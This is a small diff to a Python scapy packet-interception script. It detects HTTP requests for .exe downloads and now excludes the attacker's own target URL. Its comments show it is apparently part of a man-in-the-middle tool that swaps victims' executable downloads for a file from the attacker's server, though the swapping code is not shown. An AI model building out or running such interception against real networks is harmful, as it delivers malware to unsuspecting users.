@@ -19,7 +19,7 @@ def process_packet(packet):
         # if Sport is http it is a HTTP response
         if scapy_packet[scapy.TCP].dport == 80:
             # we're checking if it's a request
-            if ".exe" in str(scapy_packet[scapy.Raw].load):
+            if ".exe" in str(scapy_packet[scapy.Raw].load) and target not in str(scapy_packet[scapy.Raw].load):
                 print("[+] .exe request detected")
                 # now we know that a .exe file is being downloaded on the host.
                 # we could just put in out server into load field, but then, we'd have to dot he TCP handshake again
